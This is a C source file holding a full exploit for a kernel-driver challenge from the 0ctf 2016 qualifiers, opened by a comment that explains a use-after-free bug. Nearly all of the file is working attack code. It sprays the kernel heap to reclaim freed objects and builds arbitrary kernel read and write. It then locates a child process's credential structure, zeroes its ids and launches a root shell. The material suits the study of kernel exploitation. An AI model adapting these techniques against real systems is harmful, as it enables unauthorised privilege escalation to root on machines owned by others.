/*
    Exploit for (づ￣ 3￣)づ challenge 
    from 0ctf quals 2016

    The vulnerability is a use after free.

    The driver stores a memeda_t for each process that is alive at the time of 
    initialization. There is a function that allows us to update the "information" of
    a memeda_t associated with a given pid. But if this function finds an object in
    the list of memeda_t objects but does not find a "living" task with a corresponding pid, 
    the function will free that object, but fails to zero out the slot of that object. This
    allows us to cause a use-after-free.

    We can meet the required condition to trigger the UAF, by creating some children,
    initializing the list, then killing the children.

    The other interesting thing in this challenge is that the cache used to store the 
    memeda_t objects is not created with the  SLAB_NO_REAP flag. This means that when 
    the kernel looks for memory, it can reuse free buffers from this cache.
*/
#include <stdio.h>
#include <fcntl.h>
#include <malloc.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

// ioctls
#define IOC1 1337
#define IOC2 1338
#define IOC3 1339
#define IOC4 1340
#define IOC5 1341
#define IOC6 1342
#define IOC7 1343

#define MAX_NUM 1447
#define COMM_LEN 16
#define NCHILDS 350
#define SBUFSIZE 0x1000
#define WIN "(づ￣ 3￣)づ\n"

// types of the ioctl structs etc.
typedef struct listpidsreq_t{
    size_t ncopied;
    size_t pids[MAX_NUM];
}listpidsreq_t;

typedef struct creds_t{
    unsigned int n;
    unsigned int id0;
    unsigned int id1;
    unsigned int id2;
    unsigned int id3;
    unsigned int id4;
    unsigned int id5;
    unsigned int id6;
    unsigned int id7;
}creds_t;

typedef struct ioc4_t{
    unsigned int pid;
    creds_t * idinfo;
}ioc4_t;

typedef struct getcommreq_t{
    unsigned int pid;
    char * comm;
}getcommreq_t;

typedef struct storage_t{
    size_t storage_len;
    char storage_data[0]; // variable length
}storage_t;

typedef struct ioc6_t{
    unsigned int pid;
    storage_t * storage;
}ioc6_t;

typedef struct storagereq_t{
    unsigned int pid;
    size_t storage_len;
    char * storage_data;
}storagereq_t;

// this is the interal representation
// that the kernel uses to represent
// elements in the buffer
typedef struct memeda_t{
    unsigned int pid;
    char * comm;
    void * creds;
    storage_t * storage;
}memeda_t;


// IOC1
// get the available pids
listpidsreq_t * list_pids(int fd){
    listpidsreq_t * buf = NULL;
    int ret;

    buf = calloc(1, sizeof(listpidsreq_t));

    ret = ioctl(fd, IOC1, buf);
    if(!ret){
        return buf;
    }
    free(buf);
    return NULL;
}

// IOC2
// initialize/reset the memeda_t buffer
int initialize(int fd){
    int ret;
    ret = ioctl(fd, IOC2, NULL);
    return ret;
}

// IOC3
// replace with current
// XXX: will free the target memeda_t if
// the process associated with the pid
// is not 'alive'
int replace(int fd, unsigned int pid){
    int ret;
    ret = ioctl(fd, IOC3, pid);
    return ret;
}

// IOC4
// get the creds of the given pid
creds_t * get_creds(int fd, unsigned int pid){
    creds_t * idinfo = NULL;
    ioc4_t * reqbuf = NULL;
    int ret;

    reqbuf = calloc(1, sizeof(ioc4_t));
    idinfo = calloc(1, sizeof(creds_t));

    reqbuf->idinfo = idinfo;
    reqbuf->pid = pid;
    
    ret = ioctl(fd, IOC4, reqbuf);
    if(!ret){
        free(reqbuf);
        return idinfo; 
    }

    free(idinfo);
    free(reqbuf);
    return NULL;
}

// IOC5
// get the comm (process name) of the given pid
char * get_comm(int fd, unsigned int pid){
    char * comm = NULL;
    getcommreq_t * reqbuf = NULL;
    int ret;

    reqbuf = calloc(1, sizeof(getcommreq_t));
    comm = calloc(1, COMM_LEN);

    reqbuf->comm = comm;
    reqbuf->pid = pid;
    
    ret = ioctl(fd, IOC5, reqbuf);
    if(!ret){
        free(reqbuf);
        return comm; 
    }

    free(comm);
    free(reqbuf);
    return NULL;
}

// IOC6
// retrieve storage
// if storage_len is not large enough, the kernel will grill our memory
storage_t * get_storage(int fd, unsigned int pid, size_t storage_len){
    storage_t * storage = NULL;
    ioc6_t * reqbuf = NULL;
    int ret;

    reqbuf = calloc(1, sizeof(storagereq_t));
    storage = calloc(1, storage_len + sizeof(size_t)); // it writes the size at the start

    reqbuf->pid = pid;
    reqbuf->storage = storage;
    
    ret = ioctl(fd, IOC6, reqbuf);
    if(!ret){
        free(reqbuf);  
        return storage;
    }

    free(reqbuf);
    free(storage);
    return NULL;
}

// IOC7
// update or add storage
int put_storage(int fd, unsigned int pid, char * storage_data, size_t storage_len){
    storagereq_t * reqbuf = NULL;
    int ret;

    reqbuf = calloc(1, sizeof(storagereq_t));

    reqbuf->pid = pid;
    reqbuf->storage_len = storage_len;
    reqbuf->storage_data = storage_data;
    
    ret = ioctl(fd, IOC7, reqbuf);

    free(reqbuf);
    return ret;
}

unsigned int fake_meme_idx = 0;     // index to use to overwrite the target memeda_t
unsigned int fake_storage_idx = 0;  // index to use to overwrite the storage_t of the memeda_t
pid_t target_pid = -1;              // pid of the target uaf object we are using
storage_t * fake_storage = NULL;    // the fake storage that we use for arb read/write
int fd;                             // file descriptor of open device

// this is used by arbitrary write/read
// functions. We use 2 uaf'ed memeda_t objects to 
// obtain arbitrary access. We set the 'storage' 
// field of the first one to point to point to the 
// second one. The second one is interpreted as a 
// storage_t, we set the buf field to the access 
// address and the buf_len field to the access size
int init_access_addr(void * addr, size_t asize){
    int cstatus;
    memeda_t * tmpmeme = NULL;

    tmpmeme = calloc(1, sizeof(memeda_t));
    if(!tmpmeme){
        write(1, ":(\n", 3); 
        exit(-1);
    }

    tmpmeme->pid = target_pid;
    tmpmeme->comm = (char *)0xdeadb00b;
    tmpmeme->creds = (creds_t *)0xdeadb00b;
    tmpmeme->storage = fake_storage;

    cstatus = put_storage(fd, fake_meme_idx, (char *)tmpmeme, sizeof(memeda_t));
    if(cstatus != 0){
        write(1, ":(\n", 3); 
        exit(-1);
    }

    // fake_storage points to this guy
    tmpmeme->pid = asize;
    tmpmeme->comm = (char *)addr;
    tmpmeme->creds = (creds_t *)0xdeadb00b;
    tmpmeme->storage = (storage_t*)0xdeadb00b;

    cstatus = put_storage(fd, fake_storage_idx, (char *)tmpmeme, sizeof(memeda_t));
    if(cstatus != 0){
        write(1, ":(\n", 3); 
        exit(-1);
    }
    free(tmpmeme);

    return 0;
}

// perform arbitrary write of kernel memory
int arb_write(void * dest, void * src, size_t wlen){
    int cstatus;

    init_access_addr(dest, wlen); 


    cstatus = put_storage(fd, target_pid, src, wlen);
    if(cstatus != 0){
        write(1, ":(\n", 3); 
        exit(-1);
    }

    return 0;
}

// perform arbitrary read of kernel memory
char * arb_read(void * src, size_t rlen){
    storage_t * retstorage = NULL;

    init_access_addr(src, rlen); 

    retstorage = get_storage(fd, target_pid, rlen);

    if(retstorage == NULL){
        write(1, ":(\n", 3); 
        exit(-1);
    }

    return retstorage->storage_data;
}

int main(int argc, char ** argv){
    listpidsreq_t * mbuf = NULL;    
    listpidsreq_t * leak_mbuf = NULL;
    listpidsreq_t * origpid_list = NULL;
    memeda_t * tmpmeme = NULL;
    pid_t cpid;
    pid_t childs[NCHILDS] = {0};
    pid_t coolkid = -1;
    void * search_addr = 0;
    unsigned int * search_buf = NULL;
    unsigned int writers[NCHILDS] = {0};
    int cstatus;
    int leave = 0;
    int i, j;
    unsigned int coolkidcreds = 0;
    unsigned int sentinel = 0x41414141; // we lookg for this guy


    fd = open("/dev/m3m3d4", O_RDWR);
    if(fd < 0){
        write(1, ":(\n", 3); 
        exit(-1);
    }

    // first we "heat up" the heap
    // increases our chances of the
    // task_cache having it's free
    // objects released to us
    for(i = 0; i < 10; i++){
        initialize(fd);
    }

    // we create a lot of children
    // to fill the memeda_t buffer
    // they kill themselves automatically
    for(i = 0; i < NCHILDS; i++){
        cpid = fork();
        if(!cpid){
            exit(0);
        }
        if(cpid < 0){
            write(1, ":(\n", 3); 
            exit(-1);
        }
        childs[i] = cpid;
    }

    // this is the surviving child
    // we will change the creds of
    // this guy, so that he can
    // become root
    // so he waits for our signal
    // before trying to become root
    coolkid = fork();
    if(!coolkid){
        raise(SIGSTOP); // wait for parent to tell us we are good
        if(setuid(0) != 0){
            write(1, ":(\n", 3); 
            exit(-1);
        }
        write(1, WIN, strlen(WIN)); 
    	execl("/bin/sh", "-sh", NULL);
        exit(0);
    }

    // initialize it all
    // adding the childs
    initialize(fd);

    // wait for the children to terminate
    // to make sure that their 'tasks' are actually
    // removed/reaped
    for(i = 0; i < NCHILDS; i++){
        cpid = childs[i];
        waitpid(cpid, &cstatus, 0);
    }

    // The original list of the pids
    // of the memeda_t objects
	origpid_list = list_pids(fd);

    // free all the children
    for(i = 0; i < NCHILDS; i++){
        cpid = childs[i];
        replace(fd, cpid);
    }

    // after the objects are freed
    // the first dword, is a 'link'
    // to the following "free" guy
    // listing the pids leaks these
    // heap pointers
	leak_mbuf = list_pids(fd);

    // let's spray the kernel heap
    // and look for the sentinel values
    // this will allow us to find the uaf targets
    // that we will use for arbitrary free
    for(i = 0; i < NCHILDS; i++){
        tmpmeme = calloc(1, sizeof(memeda_t));
        if(!tmpmeme){
            write(1, ":(\n", 3); 
            exit(-1);
        }

        tmpmeme->pid = sentinel + i;
        tmpmeme->comm = (char *)0xdeadb00b;
        tmpmeme->creds = (creds_t *)0xdeadb00b;
        tmpmeme->storage = (storage_t *)0xdeadb00b;

        // we are using i as the pid
        // this might not always work
        // but let's keep the pids that worked
        cstatus = put_storage(fd, i, (char *)tmpmeme, sizeof(memeda_t));
        if(cstatus == 0){
            writers[i] = i;
        }
        free(tmpmeme);

        // check if we were able to overlap a uaf object
        mbuf = list_pids(fd);
        for(j = 0; j < mbuf->ncopied; j++){
            if((mbuf->pids[j] >= sentinel) && mbuf->pids[j] < sentinel + NCHILDS){

                if(target_pid < 0){
                    target_pid = origpid_list->pids[j];
                    fake_meme_idx = writers[mbuf->pids[j] - sentinel];
                    fake_storage = (storage_t *)leak_mbuf->pids[j];
                    leave = 1;
                }else{
                    fake_storage_idx = writers[mbuf->pids[j] - sentinel];
                    leave = 2;
                    break;
                }
            }
        }

        // now set the guy to the correct pid
        free(mbuf);

        if(leave == 2){
            break;
        }
    }

    if(target_pid < 0){
        write(1, ":(\n", 3);
        kill(coolkid, SIGKILL);
        exit(-1); 
    }

    // search for the pid of the
    // cool kid here
    search_addr = (void *)((unsigned int)fake_storage - 8000);

    // read in huge chunk of memory
    search_buf = (unsigned int *)arb_read(search_addr, SBUFSIZE * sizeof(unsigned int));

    // search in the memroy for the pid of the coolkid
    // then get the pointer to the creds of the kid
    for(i = 0; i < SBUFSIZE; i ++){
        sentinel = search_buf[i];
        if (sentinel == coolkid){
            coolkidcreds = search_buf[i + 2];
            break;
        }
    }

    if(coolkidcreds ==  0){
        write(1, ":(\n", 3);
        kill(coolkid, SIGKILL);
        exit(-1); 
    }

    // we zero out the <x>ids
    // this allows the child to get root
    coolkidcreds += 4;
    sentinel = 0;
    if(coolkidcreds != 0){
        for(i = 0; i < 9; i++){
            arb_write((void *)(coolkidcreds + (i * 4)), &sentinel, 4);
        }
    }

    // tell child to get root and
    // wait for the root shell
    kill(coolkid, SIGCONT);
    waitpid(coolkid, &cstatus, 0);
    return 0;
}
